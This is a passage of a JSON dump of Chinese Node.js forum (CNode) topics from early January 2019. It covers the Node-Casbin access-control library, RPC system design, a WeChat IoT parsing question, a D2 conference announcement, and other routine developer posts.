href=\"https://github.com/TakWolf/CNode-Material-Design\">CNodeMD</a></p>\n</div>","title":"nodejs/vuex 项目招人了 ，有时间，有技术的noder来，代码变现 ~_~ 【兼职】","last_reply_at":"2019-01-03T11:27:46.808Z","good":false,"top":false,"reply_count":0,"visit_count":931,"create_at":"2019-01-03T11:27:46.808Z","author":{"loginname":"RajanZhan","avatar_url":"https://avatars1.githubusercontent.com/u/15818327?v=4&s=120"}},{"id":"5c2d92cf3898674067a7a8ab","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>请问下存储视频图片用第三方的七牛好，还是公司自己服务器存储好点？</p>\n</div>","title":"请问下存储视频图片用第三方的七牛好，还是公司自己服务器存储好点？","last_reply_at":"2019-01-03T10:57:34.725Z","good":false,"top":false,"reply_count":1,"visit_count":604,"create_at":"2019-01-03T04:42:55.090Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c2ddf505bf06c5e7e3f0d8e","author_id":"5c07a4e1d3b8ab334e8db215","tab":"share","content":"<div class=\"markdown-text\"><p>Looking Into The Future: Where is the Limit of Science and Technology?</p>\n<p><a href=\"https://www.youtube.com/watch?v=bTRm_eT_ptY\">https://www.youtube.com/watch?v=bTRm_eT_ptY</a></p>\n<p>Technology has changed our lives, yet others say, technology is a tool for the rulers. This time, technology will truly fight for the benefits of majority. V-Dimension will be released officially on Jan. 24. We invite you to join us to explore a dimension of freedom.\n<img src=\"//static.cnodejs.org/FiKZlYiBPXFRKmEzwyQ7u4_31hLa\" alt=\"21DAY.png\"></p>\n</div>","title":"Looking Into The Future: Where is the Limit of Science and Technology?","last_reply_at":"2019-01-03T10:09:20.077Z","good":false,"top":false,"reply_count":0,"visit_count":384,"create_at":"2019-01-03T10:09:20.077Z","author":{"loginname":"17085101460","avatar_url":"https://avatars3.githubusercontent.com/u/45624434?v=4&s=120"}},{"id":"5b713de4b71aedfe4c12694d","author_id":"56d07b9c9f876b7e66585794","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FuAUwhnY_Rt7OIoU2QaEc-ACUrJ5\" alt=\"casbin-logo.png\"> <img src=\"//static.cnodejs.org/FsdmwP6DmiLwsUdIJp1Z1sCe2N7U\" alt=\"casbin-logo (1).png\">\nNode-Casbin 是一个用 Node.js 语言打造的轻量级开源访问控制框架（<a href=\"https://github.com/casbin/node-casbin\"> https://github.com/casbin/node-casbin</a> )，目前在 GitHub 开源。Node-Casbin 采用了元模型的设计思想，支持多种经典的访问控制方案，如基于角色的访问控制 RBAC、基于属性的访问控制 ABAC 等。</p>\n<h2>Node-Casbin 的主要特性包括：</h2>\n<ol>\n<li>支持自定义请求的格式，默认的请求格式为{subject, object, action}；</li>\n<li>具有访问控制模型 model 和策略 policy 两个核心概念；</li>\n<li>支持 RBAC 中的多层角色继承，不止主体可以有角色，资源也可以具有角色；</li>\n<li>支持超级用户，如 root 或 Administrator，超级用户可以不受授权策略的约束访问任意资源；</li>\n<li>支持多种内置的操作符，如 keyMatch，方便对路径式的资源进行管理，如 /foo/bar 可以映射到 /foo*；</li>\n</ol>\n<h2>Node-Casbin 不做的事情：</h2>\n<ol>\n<li>身份认证 authentication （即验证用户的用户名、密码），Node-Casbin 只负责访问控制。应该有其他专门的组件负责身份认证，然后由 Node-Casbin 进行访问控制，二者是相互配合的关系；</li>\n<li>管理用户列表或角色列表。Node-Casbin 认为由项目自身来管理用户、角色列表更为合适，Node-Casbin 假设所有策略和请求中出现的用户、角色、资源都是合法有效的。</li>\n</ol>\n<h2>安装</h2>\n<blockquote>\n<p>npm install casbin</p>\n</blockquote>\n<h2>HelloWorld 例子</h2>\n<p>初始化一个 enforcer，传入两个参数：模型文件路径和策略文件路径；</p>\n<pre class=\"prettyprint\"><code>const enforcer = new Enforcer(&#x27;path&#x2F;to&#x2F;model.conf&#x27;, &#x27;path&#x2F;to&#x2F;policy.csv&#x27;);\n</code></pre><p>在你的代码需要进行访问控制的位置，加入如下钩子；</p>\n<pre class=\"prettyprint\"><code>const sub = &#x27;alice&#x27;; &#x2F;&#x2F; the user that wants to access a resource.\nconst obj = &#x27;data1&#x27;; &#x2F;&#x2F; the resource that is going to be accessed.\nconst act = &#x27;read&#x27;; &#x2F;&#x2F; the operation that the user performs on the resource.\n \nif (enforcer.enforce(sub, obj, act) == true) {\n    &#x2F;&#x2F; permit alice to read data1\n} else {\n    &#x2F;&#x2F; deny the request, show an error\n}\n</code></pre><p>采用管理 API 进行权限的管理，如获取一个用户所有的角色；</p>\n<pre class=\"prettyprint\"><code>const roles = enforcer.getRoles(&#x27;alice&#x27;);\n</code></pre><p>请参考<a href=\"https://github.com/casbin/node-casbin/tree/master/test\">test</a>目录获得更多的使用方法。</p>\n<h2>社区进展</h2>\n<p>Node-Casbin 目前正在积极向社区进行推送，目前通过插件的方式已经支持与 Koa2 等 Web 框架进行集成，将来会推广到更多 Web 框架以及社区。Casbin 已经有 Golang 版本、Java 版本和 PHP 版本。有跨语言需求的开发者可以只用 Casbin 这一套框架就实现多个不同语言的项目的权限管理任务。</p>\n<ol>\n<li>Casbin (Go)： <a href=\"https://github.com/casbin/casbin\">https://github.com/casbin/casbin</a></li>\n<li>jCasbin (Java)： <a href=\"https://github.com/casbin/jcasbin\">https://github.com/casbin/jcasbin</a></li>\n<li>PHP-Casbin (PHP)： <a href=\"https://github.com/sstutz/php-casbin\">https://github.com/sstutz/php-casbin</a></li>\n<li>Node-Casbin (Node.js): <a href=\"https://github.com/casbin/node-casbin\">https://github.com/casbin/node-casbin</a></li>\n</ol>\n<h2>协议</h2>\n<p>Node-Casbin 采用 Apache 2.0 开源协议发布。</p>\n<h2>联系作者</h2>\n<p>有问题请提交 Issues: <a href=\"https://github.com/casbin/node-casbin/issues\">https://github.com/casbin/node-casbin/issues</a>，</p>\n<p>或者加入 QQ 群：<a href=\"https://jq.qq.com/?_wv=1027&amp;k=5CcglYn\">546057381</a>（ Casbin 访问控制讨论群）</p>\n</div>","title":"Node-Casbin：支持 ACL、RBAC、ABAC 多种模型的 Node.js 权限管理框架","last_reply_at":"2019-01-03T09:49:09.087Z","good":false,"top":false,"reply_count":13,"visit_count":2713,"create_at":"2018-08-13T08:14:28.073Z","author":{"loginname":"hsluoyz","avatar_url":"https://avatars0.githubusercontent.com/u/3787410?v=4&s=120"}},{"id":"5c2d73403898674067a7a767","author_id":"595dc9f2d1d54a0a0890b4ec","tab":"ask","content":"<div class=\"markdown-text\"><p>最近在调研关于微信IOT厂商云接入方案，官方给出的硬件设备接收微信图片类型，我们在demo尝试时，发现设备可以接收到微信服务侧推送过来的消息，文件可以下载，但是解析不了，因为不知道文件格式，测试消息内容如下:\n“services”:{“wxmsg_file”:{“type”:&quot;&quot;,“name”:&quot;&quot;,“size”:0,“md5”:&quot;&quot;,“download_url”:“<a href=\"http://wxapp.tc.qq.com/202/20303/stodownload?filekey=30280201010421301f020200ca0402535a04107c9e985a84e84832d047f94a884c6209020300a7d10400&amp;hy=SZ&amp;storeid=32303137303832333037343534373030303537666238613137613061366237636463333830613030303030306361&amp;bizid=1023%22%7D,%22wxmsg_image%22:%7B%22type%22:%22%22,%22name%22:%22%22,%22size%22:0,%22md5%22:%22%22,%22download_url%22:%22http://wxapp.tc.qq.com/202/20303/stodownload?filekey=30280201010421301f020200ca0402535a04107c9e985a84e84832d047f94a884c6209020300a7d10400&amp;hy=SZ&amp;storeid=32303137303832333037343534373030303537666238613137613061366237636463333830613030303030306361&amp;bizid=1023%22,%22enckey%22:%223184723871195037523\">http://wxapp.tc.qq.com/202/20303/stodownload?filekey=30280201010421301f020200ca0402535a04107c9e985a84e84832d047f94a884c6209020300a7d10400&amp;hy=SZ&amp;storeid=32303137303832333037343534373030303537666238613137613061366237636463333830613030303030306361&amp;bizid=1023&quot;},“wxmsg_image”:{“type”:&quot;&quot;,“name”:&quot;&quot;,“size”:0,“md5”:&quot;&quot;,“download_url”:“http://wxapp.tc.qq.com/202/20303/stodownload?filekey=30280201010421301f020200ca0402535a04107c9e985a84e84832d047f94a884c6209020300a7d10400&amp;hy=SZ&amp;storeid=32303137303832333037343534373030303537666238613137613061366237636463333830613030303030306361&amp;bizid=1023”,“enckey”:&quot;3184723871195037523</a>”}}\n我们也试了一些办法，都无法解析。。。。\n请问还有做过微信硬件平台厂商云接入的同学，是否有碰到过这个问题？\n帮小弟解个惑\n谢谢~</p>\n</div>","title":"微信硬件平台厂商云接入，图片类型信息，不知如何解析","last_reply_at":"2019-01-03T09:45:17.725Z","good":false,"top":false,"reply_count":3,"visit_count":587,"create_at":"2019-01-03T02:28:16.159Z","author":{"loginname":"xwwscu","avatar_url":"https://avatars1.githubusercontent.com/u/8022267?v=4&s=120"}},{"id":"5bffb25cd6104a4f803a2dfb","author_id":"4f3e074762b5c6a270012916","tab":"share","content":"<div class=\"markdown-text\"><p>第13届D2前端技术论坛（D2前端技术论坛 2018）将于2019年1月6日在杭州和达希尔顿逸林酒店举办。\n大会官方网站：<a href=\"http://d2forum.alibaba-inc.com\">http://d2forum.alibaba-inc.com</a> 如果你对本次会议感兴趣，立即访问报名吧！</p>\n<p>历时近 10 年的发展,成功举办了 12 届，D2 为国内前端领域的开发者和设计者，以及所有对前端技术感兴趣的人提供一个交流的机会，以技术会友， 一起分享技术的乐趣,探讨行业的发展。</p>\n<p><img src=\"//static.cnodejs.org/FtjmBMJk3gso7WqNdgO_twrXkWU7\" alt=\"D2-2nd.jpg\"></p>\n<p>本次大会将设置3个分场，6大主题方向。将邀请近30位演讲嘉宾，给大家带来最前沿，最实用，最有价值的演讲，值得你期待！\n如果你想参加本次大会，可以访问大会网站（<a href=\"http://d2forum.alibaba-inc.com\">http://d2forum.alibaba-inc.com</a>）立即购买门票。</p>\n<h3>大会门票</h3>\n<p>本次大会一共设置四个类型的门票：</p>\n<ul>\n<li>早鸟票（459元）</li>\n<li>早鸟拼团票 （3人成团，只需要399元）</li>\n<li>普通票 （559元）</li>\n<li>晚鸟票 （659元）</li>\n</ul>\n<p>现在就可以购买早鸟票或者早鸟拼团票，数量有限，购买时间也有限制，如果你对本次会议感兴趣，那就赶紧拿起手机访问大会网站购票吧：</p>\n<p>第13届D2前端技术论坛将于2019年1月6日在杭州举办！抢票进行中…  <a href=\"http://d2forum.alibaba-inc.com\">http://d2forum.alibaba-inc.com</a></p>\n<p>2019年1月6日，期待与你在D2现场相见！</p>\n</div>","title":"第13届D2前端技术论坛将于2019年1月6日在杭州举办，6大主题方向等你来听","last_reply_at":"2019-01-03T06:47:20.877Z","good":false,"top":false,"reply_count":25,"visit_count":5082,"create_at":"2018-11-29T09:33:16.969Z","author":{"loginname":"lovevfp","avatar_url":"https://avatars.githubusercontent.com/u/285661?v=3&s=120"}},{"id":"5c29ecb03898674067a79d7c","author_id":"5c29e89b3898674067a79d6e","tab":"ask","content":"<div class=\"markdown-text\"><p>var server = new http.Server();\n\tserver.on(‘request’,function(request,response){}</p>\n<pre class=\"prettyprint\"><code>这个地方的request我看书上似乎是http.ServerRequest的实例，但是实际上发现console.log(request)是IncomingMessage,\nrequest.addListener(&#x27;data&#x27;,function(data){\n\t \tredData += data;\n\t });\n但是是IncomingMessage中似乎没有data事件，很迷惑，求助</code></pre></div>","title":"书上看到requestServer，手册中却没有，现在是改成什么了吗","last_reply_at":"2019-01-03T06:28:06.938Z","good":false,"top":false,"reply_count":1,"visit_count":704,"create_at":"2018-12-31T10:17:20.712Z","author":{"loginname":"LurenAA","avatar_url":"https://avatars3.githubusercontent.com/u/45759613?v=4&s=120"}},{"id":"5c29ed093898674067a79d7f","author_id":"5c29eb723898674067a79d76","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/yangcecode/crawler\">github地址  </a>\n第一次写后台的得东西，有的一些小地方就要想好久，以后打算写一个小程序、pc端、后台管理。加油吧</p>\n</div>","title":"用 koa puppeteer 写一个爬虫平台 刚刚开始","last_reply_at":"2019-01-03T03:49:24.003Z","good":false,"top":false,"reply_count":2,"visit_count":923,"create_at":"2018-12-31T10:18:49.503Z","author":{"loginname":"yangcecode","avatar_url":"https://avatars3.githubusercontent.com/u/37173735?v=4&s=120"}},{"id":"5c2d80f93898674067a7a84b","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>RPC是一种方便的网络通信编程模型，由于和编程语言的高度结合，大大减少了处理网络数据的复杂度，让代码可读性也有可观的提高。但是RPC本身的构成却比较复杂，由于受到编程语言、网络模型、使用习惯的约束，有大量的妥协和取舍之处。本文就是通过分析几种流行的RPC实现案例，提供大家在设计RPC系统时的参考。</p>\n<p>由于RPC底层的网络开发一般和具体使用环境有关，而编程实现手段也非常多样化，但不影响使用者，因此本文基本涉及如何实现一个RPC系统。</p>\n<h2>认识 RPC （远程调用）</h2>\n<p>我们在各种操作系统、编程语言生态圈中，多少都会接触过“远程调用”的概念。一般来说，他们指的是用简单的一行代码，通过网络调用另外一个计算机上的某段程序。比如：</p>\n<ul>\n<li>RMI——Remote Method Invoke：调用远程的方法。“方法”一般是附属于某个对象上的，所以通常RMI指对在远程的计算机上的某个对象，进行其方法函数的调用。</li>\n<li>RPC——Remote Procedure Call：远程过程调用。指的是对网络上另外一个计算机上的，某段特定的函数代码的调用。</li>\n</ul>\n<p>远程调用本身是网络通信的一种概念，他的特点是把网络通信封装成一个类似函数的调用。网络通信在远程调用外，一般还有其他的几种概念：数据包处理、消息队列、流过滤、资源拉取等待。下面比较一下他们差异：</p>\n<table>\n<thead>\n<tr>\n<th>方案</th>\n<th>编程方式</th>\n<th>信息封装</th>\n<th>传输模型</th>\n<th>典型应用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>远程调用</td>\n<td>调用函数，输入参数，获得返回值。</td>\n<td>使用编程语言的变量、类型、函数</td>\n<td>发出请求，获得响应</td>\n<td>Java RMI</td>\n</tr>\n<tr>\n<td>数据包处理</td>\n<td>调用Send()/Recv()，使用字节码数据，编解码，处理内容</td>\n<td>把通信内容构造成二进制的协议包</td>\n<td>发送/接收</td>\n<td>UDP编程</td>\n</tr>\n<tr>\n<td>消息队列</td>\n<td>调用Put()/Get()，使用“包”对象，处理其包含的内容</td>\n<td>消息被封装成语言可用的对象或结构</td>\n<td>对某队列，存入一个消息；取出一个消息</td>\n<td>ActiveMQ</td>\n</tr>\n<tr>\n<td>流过滤</td>\n<td>读取一个流，或写出一个流，对流中的单元包即刻处理</td>\n<td>单元长度很小的统一数据结构</td>\n<td>连接；发送/接收；处理</td>\n<td>网络视频</td>\n</tr>\n<tr>\n<td>资源拉取</td>\n<td>输入一个资源ID，获得资源内容</td>\n<td>请求或响应都包含：头部+正文</td>\n<td>请求后等待响应</td>\n<td>WWW</td>\n</tr>\n</tbody>\n</table>\n<p>针对远程调用的特点——调用函数。业界在各种语言下都开发过类似的方案，同时也有些方案是试图做到跨语言的。尽管远程调用在编程方式上，看起来似乎是最简单易用的，但是也有明显的缺点。所以了解清楚远程调用的优势和缺点，是决定是否要开发、或者使用远程调用这种模型的关键问题。</p>\n<p>远程调用的优势有：</p>\n<ul>\n<li>屏蔽了网络层。因此在传输协议和编码协议上，我们可以选择不同的方案。比如WebService方案就是用的HTTP传输协议+SOAP编码协议；而REST的方案往往使用HTTP+JSON协议。Facebook的Thrift甚至可以定制任何不同的传输协议和编码协议，你可以用TCP+Google Protocol Buffer，也可以用UDP+JSON……。由于屏蔽了网络层，你可以根据实际需要来独立的优化网络部分，而无需涉及业务逻辑的处理代码，这对于需要在各种网络环境下运行的程序来说，非常有价值。</li>\n<li>函数映射协议。你可以直接用编程语言来书写数据结构和函数定义，取代编写大量的编码协议格式和分包处理逻辑。对于那些业务逻辑非常复杂的系统，比如网络游戏，可以节省大量定义消息格式的时间。而且函数调用模型非常容易学习，不需要学习通信协议和流程，让经验较浅的程序员也能很容易的开始使用网络编程。</li>\n</ul>\n<p>远程调用的缺点：</p>\n<ul>\n<li>增加了性能消耗。由于把网络通信包装成“函数”，需要大量额外的处理。比如需要预生产代码，或者使用反射机制。这些都是额外消耗CPU和内存的操作。而且为了表达复杂的数据类型，比如变长的类型string/map/list，这些都要数据包中增加更多的描述性信息，则会占用更多的网络包长度。</li>\n<li>不必要的复杂化。如果你仅仅是为了某些特定的业务需求，比如传送一个固定的文件，那么你应该用HTTP/FTP协议模型。如果为了做监控或者IM软件，用简单的消息编码收发会更快速高效。如果是为了做代理服务器，用流式的处理会很简单。另外，如果你要做数据广播，那么消息队列会很容易做到，而远程调用这几乎无法完成。</li>\n</ul>\n<p>因此，远程调用最适合的场景是：业务需求多变，网络环境多变。</p>\n<h2>RPC方案的核心问题</h2>\n<p>由于远程调用的使用接口是“函数”，所以要如何构建这个“函数”，就产生了三个方面需要决策的问题：</p>\n<h3>1 . 如何表示“远程”的信息</h3>\n<p>所谓远程，就是指网络上另外一个位置，那么网络地址就是必须要输入的部分。在TCP/IP网络下，IP地址和端口号代表了运行中程序的一个入口。所以指定IP地址和端口是发起远程调用所必需的。</p>\n<p>然而，一个程序可能会运行很多个功能，可以接收多个不同含义的远程调用。这样如何去让用户指定这些不同含义的远程调用入口，就成为了另外一个问题。当然最简单的是每个端口一种调用，但是一个IP最多支持65535个端口，而且别的网络功能也可能需要端口，所以这种方案可能会不够用，同时一个数字代表一个功能也不太好理解，必须要查表才能明白。</p>\n<p>所以我们必须想别的方法。在面向对象的思想下，有些方案提出了：以不同的对象来归纳不同的功能组合，先指定对象，再指定方法。这个想法非常符合程序员的理解方式，EJB就是这种方案的。一旦你确定了用对象这种模型来定义远程调用的地址，那么你就需要有一种指定远程对象的方法，为了指定对象，你必须要能把对象的一些信息，从被调用方（服务器端）传输给调用方（客户端）。</p>\n<p>最简单的方案就是客户端输入一串字符串作为对象的“名字”，发给服务器端，查找注册了这个“名字”的对象，如果找到了，服务器端就会用某种技术“传输”这个对象给客户端，然后客户端就可以调用他的方法了。当然这种传输不可能是把整个服务器上的对象数据拷贝给客户端，而是用一些符号或者标志的方法，来代表这个服务器上的对象，然后发给客户端。</p>\n<p>如果你不是使用面向对象的模型，那么远程的一个函数，也是必须要定位和传输的，因为你调用的函数必须先能找到，然后成为客户端侧的一个接口，才能调用。针对“远程对象”（这里说的对象包括面向对象的对象或者仅仅是 函数）如何表达才能在网络上定位；以及定位成功之后以什么形式供客户端调用，都是“远程调用”设计方案中第一个重要的问题。</p>\n<h3>2 . 函数的接口形式应该如何表示</h3>\n<p>远程调用由于受到网络通信的约束，所以往往不能完全的支持编程语言的所有特性。比如C语言函数中的指针类型参数，就无法通过网络传递出去。因此远程调用的函数定义，能用语言中的什么特性，不能用什么特性，是需要在设计方案是规定下来的。</p>\n<p>这种规定如果太严格，会影响使用者的易用性；如果太宽泛，则可能导致远程调用的性能低下。如何去设计一种方式，把编程语言中的函数，描述成一个远程调用的函数，也是需要考虑的问题。很多方案采用了配置文件这种通用的方式，而另外一些方案可以直接在源代码中里面加特殊的注释。</p>\n<p>一般来说，编译型语言如C/C++只能采用源代码根据配置文件生成的方案，虚拟机型语言如C#/JAVA可以采用反射机制结合配置文件（设置是在源代码中用特殊注释来代替配置文件）的方案，如果是脚本语言就更简单，有时候连配置文件都不需要，因为脚本自己就可以充当。总之远程调用的接口要满足怎样的约束，也是一个需要仔细考虑的问题。</p>\n<h3>3. 用什么方法来实现网络通信</h3>\n<p>远程调用最重要的实现细节，就是关于网络通信。用何种通信方式来承载远程调用的问题，细化下来就是两个子问题：用什么样的服务程序提供网络功能？用什么样的通信协议？</p>\n<p>远程调用系统可以自己直接对TCP/IP编程来实现通信，也可以委托一些其他软件，比如Web服务器、消息队列服务器等等……也可以使用不同的网络通信框架，如Netty/Mina这些开源框架。通信协议则一般有两层：一个是传输协议，比如TCP/UDP或者高层一点的HTTP，或者自己定义的传输协议；另外一个是编码协议，就是如何把一个编程语言中的对象，序列化和反序列化成为二进制字节流的方案，流行的方案有JSON、Google Protocol Buffer等等，很多开发语言也有自己的序列化方案，如JAVA/C#都自带。以上这些技术细节，应该选择使用哪些，直接关系到远程调用系统的性能和环境兼容性。</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/8f02aea0cf896c9c1cb620463cd960a0/image.png\" alt=\"img\"></p>\n<p>以上三个问题，就是远程调用系统必须考虑的核心选型。根据每个方案所面对的约束不同，他们都会在这三个问题上做出取舍，从而适应其约束。但是现在并不存在一个“万能”或者“通用”的方案，其原因就是：在如此复杂的一个系统中，如果要照顾的特性越多，需要付出的成本（易用性代价、性能开销）也会越多。</p>\n<p>下面，我们可以研究下业界现存的各种远程调用方案，看他们是如何在这三个方面做平衡和选择的。</p>\n<h2>业界方案举例</h2>\n<h3>1. CORBA</h3>\n<p>CORBA是一个“古老”的，雄心勃勃的方案，他试图在完成远程调用的同时，还完成跨语言的通信的任务，因此其复杂程度是最高的，但是它的设计思想，也被后来更多的其他方案所学习。在通信对象的定位上，它使用URL来定义一个远程对象，这是在互联网时代非常容易接受的。其对象的内容则限定在C语言类型上，并且只能传递值，这也是非常容易理解的。为了能让不同语言的程序通信，所以就必须要在各种编程语言之外独立设计一种仅仅用于描述远程接口的语言，这就是所谓的IDL：Interface Description Language 接口描述语言。</p>\n<p>用这个方法，你就可以先用一种超然于所有语言之外的语言来定义接口，然后使用工具自动生成各种编程语言的代码。这种方案对于编译型语言几乎是唯一选择。CORBA并没有对通信问题有任何约定，而是留给具体语言的实现者去处理，这也许是他没有广泛流行的原因之一。</p>\n<p>实际上CORBA有一个非常著名的继承者，他就是Facebook公司的Thrift框架。Thrift也是使用一种IDL编译生成多种语言的远程调用方案，并且用C++/JAVA等多种语言完整的实现了通信承载，所以在开源框架中是特别有号召力的一个。Thrfit的通信承载还有个特点，就是能组合使用各种不同的传输协议和编码协议，比如TCP/UDP/HTTP配合JSON/BIN/PB……这让它几乎可以选择任何的网络环境。</p>\n<p>Thrift的模型类似下图，这里有的stub表示“桩代码”，就是客户端直接使用的函数形式程序；skeleton表示“骨架代码”，是需要程序员编写具体提供远程服务功能的模板代码，一般对模版做填空或者继承（扩展）即可。这个stub-skeleton模型几乎是所有远程调用方案的标配。</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/c1021099cf902b739a32927c62c020ed/image.png\" alt=\"img\"></p>\n<h3>2. JAVA RMI</h3>\n<p>JAVA RMI是JAVA虚拟机自带的一个远程调用方案。它也是可以使用URL来定位远程对象，使用JAVA自带的序列化编码协议传递参数值。在接口描述上，由于这是一个仅限于JAVA环境下的方案，所以直接用JAVA语言的Interface类型作为定义语言。用户通过实现这个接口类型来提供远程服务，同时JAVA会根据这个接口文件自动生成客户端的调用代码供调用者使用。他的底层通信实现，还是用TCP协议实现的。在这里，Interface文件就是JAVA语言的IDL，同时也是skeleton模板，供开发者来填写远程服务内容。而stub代码则由于JAVA的反射功能，由虚拟机直接包办了。</p>\n<p>这个方案由于JAVA虚拟机的支持，使用起来非常简单，完全按照标志的JAVA编程方法就可以轻松解决问题，但是这也仅仅能在JAVA环境下运行，限制了其适用的范围。鱼与熊掌不可兼得，易用性和适用性往往是互相冲突的。这和CORBA/Thrift追求最大范围的适用性有很大的差别，也导致了两者在易用性上的不同。</p>\n<h3>3. Windows RPC</h3>\n<p>Windows中对RPC支持是比较早和比较完善的。首先它通过GUID来查询对象，然后使用C语言类型作为参数值的传递。由于Windows的API主要是C语言的，所以对于RPC功能来说，还是要用一种IDL来描述接口，最后生成.h和.c文件来生产RPC的stub和skeleton代码。而通信机制，由于是操作系统自带的，所以使用内核LPC机制承载，这一点还是对使用者来说比较方便的。但是也限制了只能用于Windows程序之间做调用。</p>\n<h3>4. WebService &amp; REST</h3>\n<p>在互联网时代，程序需要通过互联网来互相调用。而互联网上最流行的协议是HTTP协议和WWW服务，因此使用HTTP协议的Web Service就顺理成章的成为跨系统调用的最流行方案。由于可以使用大多数互联网的基础设施，所以Web Service的开发和实现几乎是毫无难度的。一般来说，它都会使用URL来定位远程对象，而参数则通过一系列预定义的类型（主要是C语言基础类型），以及对象序列化方式来传递。接口生成方面，你可以自己直接对HTTP做解析，也可以使用诸如WSDL或者SOAP这样的规范。在REST的方案中，则限定了只有PUT/GET/DELETE/POST四种操作函数，其他都是参数。</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/30fd3a0508959eb601054f92e329bfa6/image.png\" alt=\"img\"></p>\n<p>总结一下上面的这些RPC方案，我们发现，针对远程调用的三个核心问题，一般业界有以下几个选择：</p>\n<ul>\n<li>远程对象定位：使用URL；或者使用名字服务来查找</li>\n<li>远程调用参数传递：使用C的基本类型定义；或者使用某种预订的序列化（反序列化）方案</li>\n<li>接口定义：使用某种特定格式的技术，直接按预先约定一种接口定义文件；或者使用某种描述协议IDL来生成这些接口文件</li>\n<li>通信承载：有使用特定TCP/UDP之类的服务器，也有可以让用户自己开发定制的通信模型；还有使用HTTP或者消息队列这一类更加高级的传输协议</li>\n</ul>\n<h2>方案选型</h2>\n<p>在我们确定了远程调用系统方案几个可行选择后，自然就要明确一下各个方案的优缺点，这样才能选择真正合适需求的设计：</p>\n<p>**1. 对于远程对象的描述：**使用URL是互联网通行的标准，比较方便用户理解，也容易添加日后需要扩展到内容，因为URL本身是一个由多个部分组合的字符串；而名字服务则老式一些，但是依然有他的好处，就是名字服务可以附带负载均衡、容灾扩容、自定义路由等一系列特性，对于需求复杂的定位比较容易实现。</p>\n<p>**2. 远程调用的接口描述：**如果只限制于某个语言、操作系统、平台上，直接利用“隐喻”方式的接口描述，或者以“注解”类型注释手段来标注源代码，实现远程调用接口的定义，是最方便不过的。但是，如果需要兼容编译型语言，如C/C++，就一定要用某种IDL来生成这些编译语言的源代码了。</p>\n<p>**3.通信承载：**给用户自己定制通信模块，能提供最好的适用性，但是也让用户增加了使用的复杂程度。而HTTP/消息队列这种承载方式，在系统的部署、运维、编程上都会比较简单，缺点就是对于性能、传输特性的定制空间就比较小。</p>\n<p>分析完核心问题，我们还需要考虑一些适用性场景：</p>\n<p>**1. 面向对象还是面向过程：**如果我们只是考虑做面向过程的远程调用，只需要定位到“函数”即可。而如果是面向对象的，则需要定位到“对象”。由于函数是无状态的，所以其定位过程可以简单到一个名字即可，而对象则需要动态的查找到其ID或句柄。</p>\n<p>**2.跨语言还是单一语言：**单一语言的方案中，头文件或接口定义完全用一种语言处理即可，如果是跨语言的，就少不免要IDL</p>\n<p>**3. 混合式通信承载还是使用HTTP服务器承载：**混合式承载可能可以用到TCP/UDP/共享内存等底层技术，可以提供最优的性能，但是使用起来必然非常麻烦。使用HTTP服务器的话，则非常简单，因为WWW服务的开源软件、库众多，而且客户端使用浏览器或者一些JS页面即可调试，缺点是其性能较低。</p>\n<p>假设我们现在要为某种业务逻辑非常多变的领域，如企业业务应用领域，或游戏服务器端领域，去设计一个远程调用系统，我们可能应该如下选择：</p>\n<p>**1. 使用名字服务定位远程对象：**由于企业服务是需要高可用性的，使用名字服务能在查询名字时识别和选择可用性服务对象。J2EE方案中的EJB（企业JavaBean）就是用名字服务的。</p>\n<p>**2. 使用IDL来生成接口定义：**由于企业服务或游戏服务，其开发语言可能不是统一的，又或者需要高性能的编程语言如C/C++，所以只能使用IDL。</p>\n<p>**3.使用混合式通信承载：**虽然企业服务看起来无需在很复杂的网络下运行，但是不同的企业的网络环境又可能是千差万别的，所以要做一个通用的系统，最好还是不怕麻烦提供混合式的通信承载，这样可以在TCP/UDP等各种协议中选择。</p>\n<p><strong>此文已由作者授权腾讯云+社区在各渠道发布</strong></p>\n<p><strong>获取更多新鲜技术干货，可以关注我们腾讯云技术社区-云加社区官方号及知乎机构号</strong></p>\n</div>","title":"如何设计一个 RPC 系统","last_reply_at":"2019-01-03T03:26:49.556Z","good":false,"top":false,"reply_count":0,"visit_count":672,"create_at":"2019-01-03T03:26:49.556Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c2115af76c4964062a1d53c","author_id":"5942903bff5813233faad8a9","tab":"share","content":"<div class=\"markdown-text\"><p>看到的时候惊呆了，紧急更新了一波，虽然挺有节日气息的，也能感受到诚意，不过产品经理不同意啊~</p>\n</div>","title":"关于ant-design的圣诞彩蛋","last_reply_at":"2019-01-03T02:26:34.009Z","good":false,"top":false,"reply_count":27,"visit_count":4305,"create_at":"2018-12-24T17:21:51.837Z","author":{"loginname":"wbget","avatar_url":"https://avatars0.githubusercontent.com/u/12776391?v=4&s=120"}},{"id":"5c2c37413898674067a7a216","author_id":"5b403ba4e374eeab6929d4bc","tab":"ask","content":"<div class=\"markdown-text\"><p>在不使用任何服务器和后端的情况下，能取到百度搜索结果的内容吗？<img src=\"//static.cnodejs.org/FlMUlW-4bJ49oUDPxAe-mM0AhWiP\" alt=\"1.png\"></p>\n</div>","title":"请教，js有什么方案可以获取百度的搜索结果内容吗？","last_reply_at":"2019-01-03T00:55:44.119Z","good":false,"top":false,"reply_count":16,"visit_count":770,"create_at":"2019-01-02T04:00:01.309Z","author":{"loginname":"mymxdcxy","avatar_url":"https://avatars1.githubusercontent.com/u/40028167?v=4&s=120"}},{"id":"55b9e875f36f579657fc52f3","author_id":"530ed7b25adfcd9c0f0713b6","tab":"share","content":"<div 